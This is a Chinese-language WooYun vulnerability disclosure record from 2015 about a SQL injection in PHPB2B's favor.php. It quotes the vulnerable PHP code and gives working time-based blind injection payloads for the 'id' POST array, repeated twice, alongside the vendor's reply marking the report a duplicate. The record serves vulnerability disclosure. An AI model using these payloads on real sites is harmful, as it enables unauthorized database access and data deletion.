{"id": 40980, "wybug_id": "wooyun-2015-090300", "wybug_title": "PHPB2B某处sql注入#6", "wybug_corp": "phpb2b.com", "wybug_author": "Th1nk", "wybug_date": "2015-01-07 12:45", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： PHPB2B某处sql注入#6 详细说明：  官网下载的最新版virtual-office/favor.php1-24行\n<?php/** *      [PHPB2B] Copyright (C) 2007-2099, Ualink Inc. All Rights Reserved. *      The contents of this file are subject to the License; you may not use this file except in compliance with the License.  * *      @version $Revision: 2075 $ */require(\"../libraries/common.inc.php\");require(\"room.share.php\");uses(\"trade\");$trade = new Trade();$trade_model = new Trades();if (isset($_POST['del'])) {        pb_submit_check('id');        $ids = implode(\",\", $_POST['id']);        $ids = \"(\".$ids.\")\";        $sql = \"DELETE FROM {$tb_prefix}favorites WHERE id IN \".$ids.\" AND member_id=\".$the_memberid;        // var_dump($sql);        // exit();        $res = $pdb->Execute($sql);        if (!$res) {                flash(\"action_failed\");        }}\n$ids = implode(\",\", $_POST['id']);$ids = \"(\".$ids.\")\";传入数组的话，就用逗号分隔，又没有单引号保护，直接可以注入。无视gpc。此处是delete型，可以用延时注入。演示如下：注入前添加一个收藏，确保表中存在记录。先不带任何参数访问。localhost/phpb2b/virtual-office/favor.php右键查看源代码。搜索formhash\n\n这个是为了防止csrf用的，一会我们注入时要一并提交。然后post提交数据del=1&id[]=1)||if(1=1,sleep(3),0)||member_id=123%23&formhash=70d974296e193c32查user()长度del=1&id[]=1)||if((length(user())>0),sleep(3),0)||member_id=123%23&formhash=70d974296e193c32延时成功del=1&id[]=1)||if((length(user())>20),sleep(3),0)||member_id=123%23&formhash=70d974296e193c32不延时原理讲明白了。我就不继续演示咯。   漏洞证明：  官网下载的最新版virtual-office/favor.php1-24行\n<?php/** *      [PHPB2B] Copyright (C) 2007-2099, Ualink Inc. All Rights Reserved. *      The contents of this file are subject to the License; you may not use this file except in compliance with the License.  * *      @version $Revision: 2075 $ */require(\"../libraries/common.inc.php\");require(\"room.share.php\");uses(\"trade\");$trade = new Trade();$trade_model = new Trades();if (isset($_POST['del'])) {        pb_submit_check('id');        $ids = implode(\",\", $_POST['id']);        $ids = \"(\".$ids.\")\";        $sql = \"DELETE FROM {$tb_prefix}favorites WHERE id IN \".$ids.\" AND member_id=\".$the_memberid;        // var_dump($sql);        // exit();        $res = $pdb->Execute($sql);        if (!$res) {                flash(\"action_failed\");        }}\n$ids = implode(\",\", $_POST['id']);$ids = \"(\".$ids.\")\";传入数组的话，就用逗号分隔，又没有单引号保护，直接可以注入。无视gpc。此处是delete型，可以用延时注入。演示如下：注入前添加一个收藏，确保表中存在记录。先不带任何参数访问。localhost/phpb2b/virtual-office/favor.php右键查看源代码。搜索formhash\n\n这个是为了防止csrf用的，一会我们注入时要一并提交。然后post提交数据del=1&id[]=1)||if(1=1,sleep(3),0)||member_id=123%23&formhash=70d974296e193c32查user()长度del=1&id[]=1)||if((length(user())>0),sleep(3),0)||member_id=123%23&formhash=70d974296e193c32延时成功del=1&id[]=1)||if((length(user())>20),sleep(3),0)||member_id=123%23&formhash=70d974296e193c32不延时原理讲明白了。我就不继续演示咯。   修复方案：  过滤   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-01-07 23:45 厂商回复： 重复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}